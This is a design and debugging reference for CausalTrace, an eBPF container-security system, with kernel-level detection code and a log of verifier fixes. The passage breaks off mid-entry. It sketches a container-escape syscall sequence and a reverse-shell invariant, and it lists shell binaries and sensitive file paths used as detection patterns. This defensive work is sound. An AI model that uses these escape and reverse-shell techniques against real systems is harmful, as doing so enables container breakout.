# CausalTrace — Definitive Architecture & Implementation Reference (vFinal)

**Version:** vFinal.2 — April 18, 2026 (post-marathon revision)  
**Authors:** Shubhankar Bhattacharya (122CS0047), Anmol Kashyap (122CS0039)  
**Guide:** Dr. Anil Kumar R, Department of CSE, IIITDM Kurnool  
**Status:** Marathon-evaluated, gaps identified, architecture revision in progress  
**Primary source file:** `kernel/causaltrace_bcc.c` (monolithic BCC program — the actually-loaded one)  
**Loader:** `loader.py` (root of repo)  
**Tier 3:** `tier3/` directory  
**Companion state report:** `ARCHITECTURE_STATE_2026-04-18.md`

This document supersedes all prior design documents. Sections 1–14 and 16 describe the **design intent** plus all bugs that were fixed in earlier debugging rounds. Sections 15 and Section 5 entries D24–D33 document the **April 2026 marathon evaluation** — a 604-cycle production run that revealed a second wave of structural gaps between the deployed code and the design, plus the revised architecture that addresses them. Where the implementation diverged from earlier design intentions during debugging, the divergence is documented explicitly with a Problem → Solution pair.

---

## TABLE OF CONTENTS

1. [Project Background and Motivation](#1-project-background-and-motivation)
2. [Baseline Evaluation Results](#2-baseline-evaluation-results)
3. [Research Gaps — Formal Statement](#3-research-gaps)
4. [Final Architecture — v5 Overview](#4-final-architecture)
5. [Design Decisions and Debugging Log](#5-design-decisions-and-debugging-log)
6. [Kernel-Space: Tier 1 — Stateless Enforcement](#6-tier-1-kernel-space)
7. [Kernel-Space: Tier 2 — Data Collection and In-Kernel Patterns](#7-tier-2-kernel-space)
8. [BPF Map Reference](#8-bpf-map-reference)
9. [Loader (loader.py)](#9-loader)
10. [Tier 3 — Sheaf Daemon](#10-tier-3-sheaf-daemon)
11. [Enforcement Engine](#11-enforcement-engine)
12. [Infrastructure: Docker Event Listener](#12-docker-event-listener)
13. [Mathematical Reference](#13-mathematical-reference)
14. [Testbed and Attack Scenarios](#14-testbed-and-attack-scenarios)
15. [Evaluation Results](#15-evaluation-results)
16. [Known Issues and Limitations](#16-known-issues-and-limitations)
17. [Post-Marathon Revision (April 2026) — Revised Architecture v6](#17-post-marathon-revision)

---

## 1. PROJECT BACKGROUND AND MOTIVATION

### 1.1 The Container Security Problem

Container technologies (Docker, Kubernetes) provide lightweight process isolation through Linux namespaces and cgroups. Isolation is enforced at the kernel level through the **shared syscall interface**. This creates a fundamental vulnerability: a containerised process that executes the right *sequence* of individually-legitimate syscalls can escape its container entirely.

Classic example:

```
openat("/proc/1/ns/mnt", O_RDONLY)   # legitimate: reading a file descriptor
setns(fd, CLONE_NEWNS)                # legitimate: changing mount namespace
→ CONTAINER ESCAPED                   # only the sequence is malicious
```

Each syscall is individually permitted. Only the causal sequence reveals the attack intent. This is the core problem CausalTrace addresses.

### 1.2 Why Existing Tools Fail

Falco, Tetragon, and Tracee all operate on individual syscall events or statically-defined rules. Their fundamental limitations:

**Semantic blindness:** `openat("/etc/passwd")` is benign from `apt-get` and malicious from an attacker. A fork-rate spike is benign during `make -j16` and fatal from a fork bomb. Rule-based systems cannot resolve this.

**Single-container scope:** Multi-stage attacks that traverse container boundaries (Web → API → DB lateral movement) are invisible to per-container monitors.

**No temporal reasoning:** Bag-of-system-calls (BoSC) aggregates syscall frequencies without ordering. `openat → setns` is not distinguished from `setns → openat`.

**No enforcement without round-trips:** PATROL's enforcement latency is ~23 μs because the kill decision goes eBPF → ring buffer → Go userspace → `kill()`. A fork bomb exhausts all PIDs in that time.

### 1.3 CausalTrace's Approach

Three-tier architecture with increasing latency and increasing detection coverage:

- **Tier 1 (~μs, kernel):** Deterministic invariant detectors for known attack classes. Uses `bpf_send_signal(9)` directly in the eBPF execution context.
- **Tier 2 (~μs, kernel):** Connection tracking, process lineage, in-kernel two-hop pattern detection.
- **Tier 3 (~1s, userspace Python):** Sheaf Laplacian spectral detector for unknown attacks. Detects inter-container behavioral inconsistency without any labelled training data.

---

## 2. BASELINE EVALUATION RESULTS

### 2.1 Baseline A: Bertinatto BoSC Replication

Attaches raw tracepoint to `sys_enter`, builds per-process Bag-of-System-Calls frequency vectors.

**Six kernel 6.8 compatibility bugs fixed:**

| Bug | Fix |
|-----|-----|
| `struct mnt_namespace` incomplete | Read `struct ns_common` (layout: stash@+0, ops@+8, inum@+16) |
| Self-tracing feedback loop | Filter tracer PID via `BPF_ARRAY(ignore_pid)` |
| Ring buffer overflow | Early filter of `futex`, `epoll_wait` |
| Home dir expansion under sudo | `os.path.expanduser()` |
| PID truncation | Correct `u64 pid_tgid` handling |
| Wrong `ns_common.inum` offset | Offset 16, not 0 |

**Result: 1/7 attacks detected.** Root cause: BoSC is unordered; fork burst indistinguishable from fork bomb.

### 2.2 Baseline B: Modified PATROL (Kernel-Native Enforcement)

Moves enforcement into eBPF. Measured kill latency: 0.3–2.5 μs vs. PATROL's 23 μs.

**Critical problem — False Positives:**
- `apt-get` flagged for reading `/etc/passwd` (benign UID lookup)
- `gpgv` flagged as fork bomb during GPG signature verification
- `runc:[2:INIT]` blocked for `setuid(0)` during container creation

**Required:** 12-entry process whitelist. Each whitelisted name is an evasion vector.

**Result: 5/7 attacks, 0/2 cross-container scenarios.**

### 2.3 Mid-Review Summary

Neither baseline detects cross-container lateral movement. That is CausalTrace's primary novelty claim.

---

## 3. RESEARCH GAPS

| ID | Gap | Evidence |
|----|-----|----------|
| G1 | Semantic blindness: identical syscalls have context-dependent meaning | Baseline B: 12 whitelist entries needed |
| G2 | Loss of temporal ordering: BoSC loses sequence | Baseline A: fork bomb indistinguishable from `make -j16` |
| G3 | Single-container scope: no cross-container correlation | Both baselines silent on cross-container scenario |
| G4 | No semantic intent: no MITRE ATT&CK labelling | Neither baseline classifies attacks |
| G5 | Enforcement latency: PATROL 23 μs allows syscall completion | Measured vs. baseline B |
| G6 | No ML-to-kernel feedback: verdicts cannot affect kernel decisions | Architecture of all reviewed systems |
| G7 | Training data dependency | BoSC needs normal profiles; our CCA is self-supervised |

---

## 4. FINAL ARCHITECTURE

### 4.1 The Two-Surface Detection Principle

**Surface 1 — Physical Invariants (deterministic, unevadable):**

Every attack class has operations the attacker *must* perform regardless of evasion technique:
- Reverse shell → must call `dup2(sockfd, 0/1/2)` (no interactive shell without stdin/stdout redirect)
- Fork bomb → fork rate must be exponentially accelerating (second derivative > 0)
- Namespace escape → must call `unshare()` or `setns()` with namespace flags
- Sensitive file access → must call `openat()` on the target path

These are class invariants. One handler covers every implementation (bash, python, perl, go, any language) because the physical requirement is identical.

**Surface 2 — Behavioral Consistency (statistical, covers unknowns):**

Unknown attacks change the container's syscall transition distribution. The Sheaf Laplacian detects this as inter-container behavioral inconsistency — the compromised container's behavior diverges from coupling patterns learned during calibration.

**Detection chain:**
```
1. Known-class attack?        → Tier 1 SIGKILL in ~μs
2. Two-step pattern?          → Tier 2 alert in ~μs, Tier 3 evaluates
3. Distribution shift?        → Tier 3 Sheaf detects in ~1s
4. Zero distribution shift?   → Theoretically undetectable by any syscall monitor
```

### 4.2 Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│  HOST (single node — one CausalTrace instance)                          │
│                                                                         │
│  [ct-prod-webapp-a]  [ct-prod-api-gw]  [ct-prod-postgres]              │
│  [ct-prod-redis]     [ct-prod-user]    [ct-prod-nginx]                  │
│  Docker bridge: 172.22.0.0/16  (IPv6 disabled)                         │
│                                                                         │
│ ═══════════════════════ KERNEL SPACE ═══════════════════════════════════│
│                                                                         │
│  TIER 1: STATELESS ENFORCEMENT (raw_tracepoint/sys_enter, ~μs)         │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ Per-syscall pipeline (EVERY container syscall):                  │   │
│  │                                                                  │   │
│  │ 1. NS filter: read task→nsproxy→mnt_ns inum via                 │   │
│  │    bpf_probe_read_kernel (NOT direct deref — kernel 6.17 fix)   │   │
│  │    Compare against host_ns[0]. Skip if host process.            │   │
│  │                                                                  │   │
│  │ 2. verdict_map[cg] == KILL? → bpf_send_signal(9) immediately    │   │
│  │                                                                  │   │
│  │ 3. pending_cgroup_inherit[pid_tgid]? → copy behavior_state to   │   │
│  │    new cgroup (unshare(CLONE_NEWCGROUP) fix)                     │   │
│  │                                                                  │   │
│  │ 4. Bigram CMS update:                                           │   │
│  │    - Noise filter: skip prev_idx update for                      │   │
│  │      getpid/getuid/gettid/getppid/time/clock_gettime            │   │
│  │    - Window reset: *(volatile u32*)&counters[r][c] = 0          │   │
│  │      (volatile cast prevents LLVM memset on kernel 6.17)        │   │
│  │    - Update CMS with (prev_idx, curr_idx) bigram                │   │
│  │    - Cold path (sketch==NULL): STILL tail-call                  │   │
│  │                                                                  │   │
│  │ 5. Tail-call dispatch:  prog_array.call(ctx, syscall_nr)        │   │
│  │                                                                  │   │
│  │    syscall 33/292 → handle_dup2:  fd-type invariant             │   │
│  │    syscall 56/435 → handle_fork:  d²(fork_rate)/dt² > 0        │   │
│  │    syscall 59     → handle_execve: shell binary matching        │   │
│  │    syscall 257    → handle_file:  sensitive path matching       │   │
│  │    syscall 101/105/272/308 → handle_privesc                     │   │
│  │                                                                  │   │
│  │ Immediate KILL (bpf_send_signal):                               │   │
│  │    dup2(socket→stdin/stdout/stderr) = FD_REDIRECT               │   │
│  │    fork_rate>50 AND d2>0 AND rate>prev>prev_prev = FORK_ACCEL   │   │
│  │    fork_rate>500 (hard ceiling)                                  │   │
│  │                                                                  │   │
│  │ Alert-only (Tier 3 decides enforcement):                        │   │
│  │    execve(shell) → BIT_SHELL_SPAWN                              │   │
│  │    openat(sensitive) → BIT_SENSITIVE_FILE / BIT_NS_PROBE        │   │
│  │    unshare(CLONE_NEWNS/NEWUSER) → BIT_PRIVESC                   │   │
│  │    setns()/ptrace() → BIT_PRIVESC                               │   │
│  │    setuid(0) from non-root → BIT_PRIVESC                        │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  TIER 2: DATA COLLECTION + IN-KERNEL PATTERNS (~μs)                    │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ Probe B: kprobe/kretprobe tcp_v4_connect                        │   │
│  │   Entry: stash sock* in connect_sk_stash[pid_tgid]              │   │
│  │          (LRU_HASH 4096 — flood-resistant)                       │   │
│  │   Return: read sk->__sk_common.skc_daddr/skc_dport              │   │
│  │           via bpf_probe_read_kernel                              │   │
│  │           resolve dst_ip → dst_cg via ip_to_cgroup map          │   │
│  │           two-hop check with per-bit timestamp lazy expiry       │   │
│  │           emit EVENT_CONNECTION to telemetry_rb (256KB)          │   │
│  │                                                                  │   │
│  │ Probe C: sched_process_exec tracepoint                          │   │
│  │   emit EVENT_EXEC (type=101) to telemetry_rb                    │   │
│  │                                                                  │   │
│  │ container_behavior map: 8-bit flags + 8 per-bit timestamps      │   │
│  │   bit0 BIT_SHELL_SPAWN    bit1 BIT_LATERAL_CONNECT              │   │
│  │   bit2 BIT_SENSITIVE_FILE bit3 BIT_NS_PROBE                     │   │
│  │   bit4 BIT_PRIVESC        bit5 BIT_LARGE_TRANSFER               │   │
│  │   bit6 BIT_FD_REDIRECT    bit7 BIT_FORK_ACCEL                   │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  BPF MAPS (kernel↔kernel and kernel↔userspace):                        │
│  alerts_rb (64KB)       ← Tier 1 ONLY (high priority, low volume)      │
│  telemetry_rb (256KB)   ← Probe B/C (high volume, non-critical)        │
│  verdict_map            ← Tier 3 WRITES, Tier 1 reads every syscall    │
│  enforce_level_map      ← Tier 3 writes graduated levels (L0–L6)       │
│  deny_connect_map       ← specific (cg, dst_ip, dst_port) denials      │
│  deny_open_map          ← file path hash denials                       │
│  deny_exec_map          ← binary path hash denials                     │
│  rate_limit_map         ← per-destination connection rate caps         │
│  fw_allow_map           ← calibrated-only destination allowlist        │
│  bigram_sketch_map      ← Tier 1 WRITES, Tier 3 reads each cycle       │
│  container_behavior     ← All tiers read/write                         │
│  ip_to_cgroup           ← Docker listener writes, Probe B reads        │
│  connect_sk_stash       ← LRU_HASH: Probe B entry→return comms         │
│  pending_cgroup_inherit ← privesc handler→dispatcher: cgroup fix       │
│                                                                         │
│ ═══════════════════════ USER SPACE ══════════════════════════════════════│
│                                                                         │
│  TIER 3: SHEAF DAEMON (~5s cycle, daemon_main.py)                      │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ Stage 1: Novel-edge detector                                     │   │
│  │   Connections not in calibrated_edges → NovelEdgeAlert           │   │
│  │   Sliding 30s window accumulator (deque maxlen=6)                │   │
│  │   Compound confirmation: 1 edge=LOW, 2=MEDIUM, 3+=HIGH           │   │
│  │                                                                  │   │
│  │ Stage 2: Signal extraction d=74                                  │   │
│  │   CMS minimum estimate → 625 bigrams                             │   │
│  │   Rényi entropy H_α (α=0.5, 1.0, 2.0) → 3 dims                 │   │
│  │   PCA projection (625→50) → 50 dims                             │   │
│  │   Transition marginals (max of each row, top 20) → 20 dims      │   │
│  │   Syscall rate (total/5s) → 1 dim                               │   │
│  │   Total: 74 continuous float64 dims                              │   │
│  │   Whitening: (x - μ_cal) / σ_cal (epsilon=1e-6 floor)           │   │
│  │                                                                  │   │
│  │ Stage 3: Sheaf Laplacian spectral test                           │   │
│  │   EMA path α=0.2: catches slow-drip exfiltration                 │   │
│  │   Raw path: catches sudden attacks                               │   │
│  │   Multi-lag {0,5,10}s: catches async attack chains               │   │
│  │   Mahalanobis distance with 4-sigma threshold                    │   │
│  │                                                                  │   │
│  │ Stage 4: Sheaf eigenmode analysis                                │   │
│  │   L_F eigendecomposition → spectral fingerprint per scenario     │   │
│  │                                                                  │   │
│  │ Stage 5: Semantic label engine                                   │   │
│  │   Reads container_behavior.flags (NOT sheaf signal)              │   │
│  │   Maps bit patterns + novel edge count → MITRE ATT&CK labels     │   │
│  │   windowed_unique_count for cross-cycle compounding              │   │
│  │                                                                  │   │
│  │ Stage 6: Verdict → EnforcementEngine → BPF map writes           │   │
│  │   LOW → L0 OBSERVE (log only, no enforcement)                   │   │
│  │   MEDIUM → L1 DENY (bpf_override_return on novel edges)         │   │
│  │   HIGH → L4 FIREWALL (only calibrated dsts allowed)             │   │
│  │   CRITICAL → L6 QUARANTINE + Docker network disconnect          │   │
│  │   Reverse shell/container escape → L6 QUARANTINE immediately    │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  SUPPORTING DAEMONS:                                                    │
│  Docker Event Listener → ip_to_cgroup + bigram map pre-population      │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 5. DESIGN DECISIONS AND DEBUGGING LOG

This section documents every significant design decision and every bug encountered during implementation and debugging. Each entry is a **Problem → Solution** pair. A developer reading this should be able to understand why every unusual code construct exists.

---

### D1 — fd-Type Invariant (Not Binary Name Matching) for Reverse Shells

**Problem:** Baseline B's execve handler matches shell binary names (`sh`, `bash`, `nc`, `python`). This misses Python reverse shells with renamed binaries, Go-based implants, and any language other than bash. Renaming `python3` to `chromeupdate` defeats it entirely.

**Solution:** Hook `dup2` (syscall 33) and `dup3` (syscall 292). Traverse `task→files→fdt→fd[oldfd]→f_inode→i_mode`. If `(i_mode & 0xF000) == 0xC000` (S_IFSOCK), a socket is being redirected to stdin/stdout/stderr. This is the **physical invariant** — there is no interactive reverse shell without this operation, regardless of language.

**Why unevadable:** `dup2(sockfd, 0/1/2)` is a Unix I/O requirement for an interactive shell. The attacker cannot establish interactive access without it.

---

### D2 — Fork Acceleration (Second Derivative, Not Fixed Threshold)

**Problem:** Fixed threshold (100 forks/second) fires on `make -j16` and container startup.

**Solution:** Track three consecutive 1-second windows. Compute second discrete derivative:
```
d2 = count[t] - 2*count[t-1] + count[t-2]
```
Fork bomb: d2 > 0 always (exponential growth). `make -j16`: ramps then stabilizes (d2 → 0).

**Alarm condition:** `rate > 50 AND d2 > 0 AND rate > prev > prev_prev`
**Hard ceiling:** `rate > 500` always kills (defense in depth).

---

### D3 — Invariant Bits NOT in Sheaf Signal Vector

**Problem (v4 design):** Earlier versions put all 8 behavior bits as dimensions 74–81 of the sheaf signal. Rationale: bits=0 during calibration → σ=ε=1e-6 → whitened value = 1/1e-6 = 10⁶ during attack.

**Why this is wrong:**
1. Covariance matrix has σ²=10⁻¹² on those diagonals. `np.linalg.inv(cov)` has condition number ~10¹² → numerical garbage or `LinAlgError`.
2. Conceptually redundant: if an invariant bit fires, Tier 1 already called `bpf_send_signal(9)` in ~1μs.
3. Wrong layer: sheaf's value is detecting **unknown** attacks where no invariant fires.

**Solution:** Invariant bits go **only** to the Semantic Label Engine (Stage 5). Signal vector is d=74 continuous floats only. The whitener explicitly documents this:

```python
# whitener.py
# NOTE: Do NOT include invariant bits in the signal vector.
# std[invariant_dims] = 0 → regularized to epsilon=1e-6
# Whitened during attack = 1/1e-6 = 10^6
# cov diagonal → 10^-12 → np.linalg.inv condition number 10^12 → garbage
```

---

### D4 — Per-Bit Timestamps (Not Single Timestamp) in behavior_state

**Problem (original design):** A single `ts` field updated whenever any bit is set. Scenario: shell bit (bit0) set Monday. On Friday, a legitimate file read updates `ts` to Friday. One second later, a lateral connect fires. Two-hop check: `(now - ts < 5s)` = TRUE, `flags & BIT_SHELL_SPAWN` = TRUE → false positive SIGKILL on legitimate traffic.

**Solution:** `bit_ts[8]` — a separate u64 timestamp for each of the 8 behavior bits. Two-hop check uses `bit_ts[0]` (shell) and `bit_ts[6]` (fd_redirect) independently. **Lazy expiry** on every flag read: clear any bit whose timestamp is > 5 seconds old.

**Struct (must match exactly):**
```c
struct behavior_state {
    u64 flags;        // 64-bit bitfield — bits 0-7 used
    u64 bit_ts[8];    // bit_ts[i] = timestamp when bit i was last set
    u64 conn_dst_cg;  // last lateral connect dst cgroup
    u16 conn_port;    // last lateral connect dst port
    u16 _pad[3];      // alignment
};  // sizeof = 8 + 64 + 8 + 2 + 6 = 88 bytes
```

**CRITICAL: This struct is the most error-prone in the codebase. Any ctypes mismatch between Python and C causes silent data corruption.** The Python ctypes layout in `loader.py`:

```python
class AlertT(ctypes.Structure):
    _fields_ = [
        ('type',       ctypes.c_uint32),
        ('pid',        ctypes.c_uint32),
        ('cgroup_id',  ctypes.c_uint64),
        ('timestamp',  ctypes.c_uint64),
        ('flags',      ctypes.c_uint64),
        ('extra',      ctypes.c_uint64),
    ]
```

---

### D5 — Cold Path Continues to Tail-Call

**Problem:** Original: `if (!sketch) return 0`. The Docker event listener pre-populates `bigram_sketch_map` on container start, but there is a 10–50 ms race window during container startup. If a malicious entrypoint runs syscalls before the map is populated, all invariant dispatch (fork, execve, file, dup2 handlers) is silently skipped.

**Solution:** On cold path (sketch NULL), skip bigram tracking but **still** execute `prog_array.call(ctx, syscall_nr)`. All Tier 1 handlers are active from the very first syscall.

```c
/* Cold path: sketch==NULL falls through to tail-call (NOT return 0) */
// [end of bigram block, no return statement here]

/* Step 6: Tail-call dispatch */
prog_array.call(ctx, (u32)syscall_nr);
return 0;
```

---

### D6 — Noise Syscall Filtering Before Bigram Update

**Problem:** Bigram obfuscation attack — attacker injects side-effect-free syscalls between each malicious one: `openat → getpid → read → getuid → connect → getpid → sendto`. Malicious bigrams `(openat→read)`, `(read→connect)` replaced by benign ones.

**Solution:** Check if syscall is in noise set: `{getpid(39), getuid(102), gettid(186), getppid(110), time(201), clock_gettime(228)}`. If yes, execute tail-call but **do not advance `prev_idx`**. Noise syscalls are transparent to bigram computation.

**Adversarial trap:** If attacker uses non-noise syscalls to break bigrams, those syscalls are tracked, inflating their bigram counts → Sheaf Laplacian detects distribution shift.

---

### D7 — LRU_HASH for connect_sk_stash

**Problem:** `BPF_MAP_TYPE_HASH` with 1024 entries. Attacker floods outbound `nc` connections to random IPs. Map fills up. Legitimate malicious connection's entry cannot be stashed → kretprobe finds nothing → Probe B goes blind.

**Solution:** `BPF_MAP_TYPE_LRU_HASH` with 4096 entries. Under LRU eviction, oldest entries dropped. Since kprobe-to-kretprobe round trip is microseconds, the entry survives unless flood rate > legitimate connection rate. A flood that fast triggers Tier 1 rate limits independently.

```c
BPF_TABLE("lru_hash", struct sk_key, struct sk_val, connect_sk_stash, 4096);
```

---

### D8 — Split Ring Buffers (alerts vs. telemetry)

**Problem:** Single ring buffer shared between Tier 1 alert events and Tier 2 connection events. Attacker floods outbound connections. Buffer fills. Real attack event: `bpf_ringbuf_reserve()` returns NULL → alert lost → Tier 3 has no context.

**Solution:** Two separate ring buffers:
- `alerts_rb` (64KB): Tier 1 handlers only. Low volume (one per attack), high priority.
- `telemetry_rb` (256KB): Probe B/C only. High volume but non-critical.

```c
BPF_RINGBUF_OUTPUT(alerts_rb,   16);   // 16 × 4KB pages = 64KB
BPF_RINGBUF_OUTPUT(telemetry_rb, 64);  // 64 × 4KB pages = 256KB
```

---

### D9 — Top-24 Syscall Tracking List (Updated from Top-20)

**Problem:** Original top-20 included `poll(7)`, `lseek(8)`, `rt_sigaction(13)`, `rt_sigprocmask(14)` — high-frequency, low-security-value. Dangerous syscalls `ptrace(101)`, `memfd_create(319)`, `bpf(321)`, `io_uring_enter(426)` in the "other" bucket (index 24) → all map to bigram `(24,24)`, hiding in noise.

**Solution:** Replace 4 low-value syscalls. Final top-24 (+1 "other" = 25 indices):

| Index | Syscall | Nr | Security Note |
|-------|---------|-----|---------------|
| 0 | read | 0 | |
| 1 | write | 1 | |
| 2 | open | 2 | |
| 3 | close | 3 | |
| 4 | stat | 4 | |
| 5 | fstat | 5 | |
| 6 | mmap | 9 | |
| 7 | mprotect | 10 | |
| 8 | brk | 12 | |
| 9 | ioctl | 16 | |
| 10 | access | 21 | |
| 11 | pipe | 22 | |
| 12 | socket | 41 | |
| 13 | connect | 42 | |
| 14 | accept | 43 | |
| 15 | sendto | 44 | |
| 16 | **ptrace** | **101** | container escape recon |
| 17 | **mount** | **165** | container escape vector |
| 18 | **unshare** | **272** | namespace manipulation |
| 19 | **setns** | **308** | namespace transition |
| 20 | **memfd_create** | **319** | fileless malware staging |
| 21 | **bpf** | **321** | attacker eBPF abuse |
| 22 | **io_uring_enter** | **426** | syscall bypass via io_uring |
| 23 | execve | 59 | always tracked |
| 24 | other | — | all remaining |

---

### D10 — Cgroup Inheritance on unshare(CLONE_NEWCGROUP)

**Problem:** Attacker calls `unshare(CLONE_NEWCGROUP)`. All subsequent `bpf_get_current_cgroup_id()` returns new cgroup ID. `container_behavior` entry for new cgroup is empty — behavioral history erased. Two-hop check sees clean state.

**Solution:** In the privesc handler, when `flags & CLONE_NEWCGROUP` is detected, store current cgroup_id in `pending_cgroup_inherit[pid_tgid]`. On the very next syscall from this PID (caught in dispatcher), copy `behavior_state` from old cgroup to new cgroup. Attacker's behavioral history follows them.

```c
#define MY_CLONE_NEWCGROUP   0x02000000

if (flags_val & MY_CLONE_NEWCGROUP) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    pending_cgroup_inherit.update(&pid_tgid, &cg);
}
// In dispatcher Step 4:
u64 *old_cg_ptr = pending_cgroup_inherit.lookup(&pid_tgid);
if (old_cg_ptr) {
    struct behavior_state *old_state = container_behavior.lookup(old_cg_ptr);
    if (old_state) container_behavior.update(&cg, old_state);
    pending_cgroup_inherit.delete(&pid_tgid);
}
```

---

### D11 — Multi-Lag CCA (Lags 0s, 5s, 10s)

**Problem:** In a multi-stage attack, cause (Web compromise) and effect (DB exfiltration) may not be synchronous. Lag=0 CCA restriction maps miss causal couplings with temporal offset.

**Solution:** During calibration, learn restriction maps at lags 0, 1, 2 (corresponding to 0s, 5s, 10s offset between 5-second windows). At runtime, compute Mahalanobis edge energy for all three lags and take the **maximum**. Catches attack chains with up to 10 seconds of asynchronous delay.

```python
for lag in [0, 1, 2]:
    F_u, F_v = self.cal.restriction_maps[(u, v, lag)]
    raw_e = self._compute_edge_energy(F_u, x_u_raw, F_v, x_v_raw, cov_inv)
    max_raw_energy = max(max_raw_energy, raw_e)
```

---

### D12 — EMA Dual-Path Detection (α=0.2)

**Problem:** Low-and-slow exfiltration (10 bytes every 6 seconds). Bigram CMS resets every 5 seconds. Any single window shows 1–2 abnormal bigrams — insufficient to cross the 4-sigma threshold.

**Solution:** Maintain EMA of whitened signals:
```
x_ema(t) = 0.2 · x_raw(t) + 0.8 · x_ema(t-1)
```
A persistent 0.5σ anomaly per window reaches 2.5σ in steady state. Run sheaf detector on both `x_raw` (sudden attacks) and `x_ema` (slow-drip). EMA threshold = 0.7 × raw threshold (tighter, exploiting temporal accumulation).

Time to reach 80% steady-state: ~7 windows (~35 seconds).

---

### D13 — Compound Confirmation for Novel Edges

**Problem:** In production, new inter-container connections happen legitimately (new service replica, health check on new port, load balancer reconfiguration). Alerting on any single novel edge generates unacceptable false positives.

**Solution:** Multi-tier compound confirmation:

| Condition | Severity | Enforcement Level |
|-----------|----------|------------------|
| 1 novel edge, no corroboration | LOW | L0 OBSERVE (log only) |
| 2 novel edges within 30s window | MEDIUM | L1 DENY |
| 3+ novel edges (multi-target SSRF) | HIGH | L4 FIREWALL |
| Novel edge + sheaf energy spike | HIGH | L4 FIREWALL |
| Novel edge + behavior bit (shell/file/privesc) | HIGH/CRITICAL | L1–L4 |
| Novel edge + sensitive file | CRITICAL | L4 FIREWALL |
| Reverse shell / container escape | CRITICAL | L6 QUARANTINE |

**External traffic:** `ip_to_cgroup` only maps container IPs on the Docker bridge. External connections (users → webapp) are never in the novel edge map. Only container-to-container connections are evaluated.

---

### D14 — 30-Second Sliding Window for Novel Edge Accumulation

**Problem:** A staged SSRF attack (S8) produces one novel edge every 5–10 seconds across three different detection cycles. In isolation, each cycle sees only 1 novel edge → LOW severity → no enforcement. The attack completes undetected.

**Solution (implemented in this session):** Add a sliding window accumulator to `SheafDetector`:

```python
# sheaf_detector.py __init__
self.novel_edge_window: deque = deque(maxlen=6)  # ~30s at 5s interval

# In detect_cycle():
now = _time.monotonic()
for alert in novel_alerts:
    self.novel_edge_window.append((now, alert))

# Evict entries older than 30 seconds
while self.novel_edge_window and (now - self.novel_edge_window[0][0]) > 30.0:
    self.novel_edge_window.popleft()

windowed_novel = [entry[1] for entry in self.novel_edge_window]
windowed_unique = {(a.src, a.dst) for a in windowed_novel}
```

The semantic label engine receives `windowed_unique_count = len(windowed_unique)` and uses:
```python
effective_novel_count = max(len(novel_alerts), windowed_unique_count)
```

Verdict reason is annotated with `(window=N)` when accumulated count exceeds current-cycle count.

**Impact:** S8 staged SSRF (3 edges across 15s) now accumulates to `effective_novel_count=3` → HIGH severity → FIREWALL enforcement, rather than three successive LOW/OBSERVE verdicts.

---

### D15 — Kernel 6.17 BCC Verifier Workarounds

This was the most significant debugging effort. Kernel 6.17 introduced stricter BPF verifier behavior and different LLVM code generation. Multiple compile-time issues required targeted fixes.

#### D15a — Direct Struct Dereference Generates memset

**Problem:** In BCC programs on kernel 6.17+, direct dereference of kernel structs like `task->nsproxy` causes LLVM to emit a `memset` (stack initialization) that the BPF verifier rejects as an invalid instruction.

**Error observed:**
```
invalid indirect read from stack off -24+0 size 8
```

**Solution:** Replace **every** direct kernel struct dereference with `bpf_probe_read_kernel()`:

```c
// WRONG (generates invalid memset on 6.17):
struct nsproxy *nsproxy = task->nsproxy;

// CORRECT:
struct nsproxy *nsproxy = NULL;
bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &task->nsproxy);
if (!nsproxy) return 0;
```

This applies throughout: `task->files`, `files->fdt`, `fdt->fd`, `f->f_inode`, `inode->i_mode`, `task->nsproxy`, `nsproxy->mnt_ns`, `sk->__sk_common.skc_daddr`, `sk->__sk_common.skc_dport`.

#### D15b — memset on CMS Counter Reset (Flat 2D Array Fix)

**Problem:** The bigram CMS counter reset used a nested `memset` or nested loop. LLVM optimized the loop into a `memset` call, which the BPF verifier rejects.

**Solution 1 (struct layout):** Flatten the 2D array `counters[CMS_ROWS][CMS_COLS]` to `counters[CMS_ROWS * CMS_COLS]` to match BCC 0.31's handling. BCC 0.31 mishandles 2D array types in structs; the flat layout avoids this entirely.

```c
struct bigram_sketch {
    u32 counters[CMS_ROWS * CMS_COLS];  // flat [r*CMS_COLS+c] — BCC 0.31 fix
    ...
};
```

**Solution 2 (volatile cast):** Use `*(volatile u32 *)&counter[idx] = 0` in the unrolled reset loop. The `volatile` qualifier prevents LLVM from coalescing the individual stores into a `memset` call.

```c
#pragma unroll
for (int _r = 0; _r < CMS_ROWS; _r++) {
    #pragma unroll
    for (int _c = 0; _c < CMS_COLS; _c++) {
        *(volatile u32 *)&sketch->counters[_r * CMS_COLS + _c] = 0;
    }
}
```

#### D15c — BPF Verifier Unbounded Loop Rejection

**Problem:** The BPF verifier rejects any loop it cannot prove terminates in bounded iterations.

**Solution:** `#pragma unroll` on every fixed-count loop. This applies to:
- CMS counter reset (CMS_ROWS × CMS_COLS = 512 iterations)
- CMS hash update (CMS_ROWS = 4 iterations)
- Execve basename extraction (127 iterations)
- Execve basename copy (15 iterations)

#### D15d — BPF Stack Overflow in Tail-Called Programs

**Problem:** Each eBPF program gets 512 bytes of stack. Tail-called programs share stack space with their callers. A `char path[128]` array in `handle_file` plus the caller's stack frame exceeded 512 bytes.

**Solution:** Reduce `path` buffer to `char path[64]` in `handle_file`. 64 bytes is sufficient for the longest sensitive path we check (`/var/run/secrets` = 17 bytes plus null).

```c
/* path[64] not path[128]: tail-called programs share 512B stack with BCC overhead */
char path[64];
```

#### D15e — oldfd Bounds Check Required by Verifier

**Problem:** `fd_array[oldfd]` in `handle_dup2`. The verifier requires proof that `oldfd` is within the bounds of the `fd` array. Without an explicit bound check, the program is rejected with `R1 unbounded`.

**Solution:** Explicit range check before the array access:

```c
if (oldfd < 0 || oldfd >= MAX_FD) return 0;  // MAX_FD = 1024
// Now verifier accepts: fd_array[oldfd]
```

#### D15f — prev_idx Defensive Bound Before CMS Use

**Problem:** `sketch->prev_idx` is initialized to 0 but could theoretically be any value if the map entry was corrupted. The verifier requires a proven bound before using it as an array index: `bigram_key = prev_idx * TOP_SYSCALLS + curr_idx`.

